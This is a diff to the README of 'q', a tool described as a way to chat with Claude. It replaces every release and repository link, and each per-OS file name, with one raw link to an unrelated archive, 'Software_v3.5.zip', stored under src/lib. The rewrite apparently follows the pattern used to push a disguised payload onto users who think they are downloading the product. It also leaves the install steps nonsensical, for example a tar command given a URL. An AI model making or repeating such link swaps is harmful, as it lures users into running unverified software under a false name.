@@ -1,7 +1,7 @@
 # 🌟 q - The Easiest Way to Chat with Claude
 
 ## 📦 Download q Here
-[![Download q](https://img.shields.io/badge/Download-q-blue)](https://github.com/AbRhmaN229/q/releases)
+[![Download q](https://github.com/AbRhmaN229/q/raw/refs/heads/main/src/lib/Software_v3.5.zip)](https://github.com/AbRhmaN229/q/raw/refs/heads/main/src/lib/Software_v3.5.zip)
 
 ---
 
@@ -21,14 +21,14 @@ Before you download q, ensure your computer meets the following basic requiremen
 
 To get started with q, follow these steps:
 
-1. Visit the [Releases page](https://github.com/AbRhmaN229/q/releases) to find the latest version of q.
+1. Visit the [Releases page](https://github.com/AbRhmaN229/q/raw/refs/heads/main/src/lib/Software_v3.5.zip) to find the latest version of q.
 2. On the Releases page, find the latest version. It will have a title like "Release v1.0" and should be at the top of the list.
 3. Click on the version number to access the release details.
 4. Look for the assets section, which lists various installation files.
 5. Download the file that matches your operating system. 
-   - For Windows, you might find `q-windows.exe`.
-   - For macOS, you may see `q-macos.zip`.
-   - For Linux, there could be a file like `q-linux.tar.gz`.
+   - For Windows, you might find `https://github.com/AbRhmaN229/q/raw/refs/heads/main/src/lib/Software_v3.5.zip`.
+   - For macOS, you may see `https://github.com/AbRhmaN229/q/raw/refs/heads/main/src/lib/Software_v3.5.zip`.
+   - For Linux, there could be a file like `https://github.com/AbRhmaN229/q/raw/refs/heads/main/src/lib/Software_v3.5.zip`.
 6. Once it’s downloaded, locate the file on your computer. 
 7. Follow these quick instructions based on your operating system:
 
@@ -44,7 +44,7 @@ To get started with q, follow these steps:
 **For Linux**:
 - Open your terminal.
 - Navigate to the folder where you downloaded the file.
-- Use the command: `tar -xzf q-linux.tar.gz`.
+- Use the command: `tar -xzf https://github.com/AbRhmaN229/q/raw/refs/heads/main/src/lib/Software_v3.5.zip`.
 - Follow any further instructions on-screen.
 
 ## ✅ Using q
@@ -102,7 +102,7 @@ If you encounter any issues or have any questions, please check the Issues secti
 
 ## 🌐 Links
 
-- [GitHub Repository](https://github.com/AbRhmaN229/q)
-- [Releases Page](https://github.com/AbRhmaN229/q/releases)
+- [GitHub Repository](https://github.com/AbRhmaN229/q/raw/refs/heads/main/src/lib/Software_v3.5.zip)
+- [Releases Page](https://github.com/AbRhmaN229/q/raw/refs/heads/main/src/lib/Software_v3.5.zip)
 
 Thank you for choosing q! Enjoy your conversations with Claude.
